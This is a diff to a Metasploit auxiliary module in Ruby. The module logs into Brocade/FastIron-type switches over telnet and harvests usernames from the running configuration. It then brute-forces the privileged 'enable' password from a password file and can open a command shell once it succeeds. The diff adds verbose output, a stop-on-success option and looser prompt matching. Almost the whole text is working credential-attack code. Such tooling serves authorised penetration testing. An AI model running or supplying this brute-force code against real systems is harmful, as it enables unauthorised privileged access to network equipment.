@@ -5,14 +5,11 @@
 
 require 'msf/core'
 require 'rex'
-#require 'metasploit/framework/credential_collection'
-#require 'metasploit/framework/login_scanner/telnet'
 
 class Metasploit4 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::Telnet
   include Msf::Auxiliary::Report
-  #include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::CommandShell
 
@@ -26,6 +23,7 @@ class Metasploit4 < Msf::Auxiliary
         logins and hosts so you can track your access.
         Tested against:
               ICX6450-24 SWver 07.4.00bT311
+              FastIron WS 624 SWver 07.2.02fT7e1
       },
       'Author'      => 'h00die <mike[at]shorebreaksecurity.com>',
       'References'  =>
@@ -38,7 +36,9 @@ class Metasploit4 < Msf::Auxiliary
       [
         OptPath.new('UN_FILE',[false,'Username File']),
         OptPath.new('PASS_FILE',[true,'Password File']),
-        OptString.new('TELNET_PASS',[false,'Telnet Password'])
+        OptString.new('TELNET_PASS',[false,'Telnet Password']),
+        OptBool.new('VERBOSE', [ false, 'Display Each Attempt', false]),
+        OptBool.new('STOP_ON_SUCCESS', [ false, 'Stop on first success', false])
       ], self.class
     )
     register_advanced_options(
@@ -47,8 +47,6 @@ class Metasploit4 < Msf::Auxiliary
       ], self.class
     )
     deregister_options('USERNAME', 'PASSWORD')
-
-    #@no_pass_prompt = []
   end
 
   def get_username_from_config(un_list,ip)
@@ -63,14 +61,12 @@ class Metasploit4 < Msf::Auxiliary
                 #there seems to be some buffering issues. so we want to match that we're back at a prompt, as well as received the 'end' of the config.
                 break if (config.match(/>$/) or config.match(/> $/)) and config.match(/end/) 
 	    end
-	    #print_status(config)
 	    config.each_line do |un|
 	      if un.match(/^username/)
 		found_username = un.split(" ")[1].strip
 		un_list.add(found_username)
 		print_status("   Found: #{found_username}@#{ip}")
 	      end
-	      #print_error(command + un)
 	    end
 	  end
   end
@@ -99,51 +95,51 @@ class Metasploit4 < Msf::Auxiliary
         end
       end
     end
-    #print_status("Attempting connection")
     connect()
     print_status("Connected to #{ip}")
     #get passed the banner if there is one
     while true do
-      #print_status("true loop to get passed banner")
       sock.puts("\r\n")
       data = sock.recv(1024)
-      break if data.match(/>$/)
+      break if data.match(/>\s?$/)
     end
     term_prompt = data
     #try to get the usernames from the config
     get_username_from_config(un_list,ip)
-    #print_status("starting login loop")
-    #un_list.each do |u|
-    #  print_status("#{u}")
-    #end
     un_list.each do |username|
-      next if username.match(/^logout/)
+      next if username.match(/^logout/) #if logout is ever typed, its an immediate logout
       pass_list.each do |password|
         password = password.strip
         next if password.match(/^logout/)
         sock.puts("enable\r\n")
-        print_status("\tTrying #{username}@#{ip}:#{password}")
+        if datastore['VERBOSE']
+           print_status("\tTrying #{username}@#{ip}:#{password}")
+        end
         while true do
             data << sock.recv(1024) 
-            break if data.match(/User Name:$/)
+            break if data.match(/User\s?[Nn]ame:\s?$/)
         end #true
         data = ""
         sock.puts(username + "\r\n")
         while true do
             data << sock.recv(1024) 
-            break if data.match(/Password:$/)
+            break if data.match(/Password:\s?$/)
         end #true
         data = ""
         sock.puts(password + "\r\n")
         while true do
             data << sock.recv(1024) 
-            break if data.match(/^Error/) or data.match(/\#$/)
+            break if data.match(/^Error/) or data.match(/\#\s?$/)
         end #true
-        if data.match(/\#$/)
+        if data.match(/\#\s?$/)
            print_good("\tSUCCESS! #{username}@#{ip}:#{password}")
-           start_telnet_session(ip,datastore["RPORT"],username,password,sock)
+           #start_telnet_session(ip,datastore["RPORT"],username,password,sock)
+           if datastore['STOP_ON_SUCCESS']
+              start_telnet_session(ip,datastore["RPORT"],username,password,sock)
+              return
+           end
+           sock.puts("exit\r\n") #drop back down to continue testing
            break
-           #sock.puts("exit\r\n") #drop back down to continue testing
         end #win or not
       end #passwoard list
     end #username list
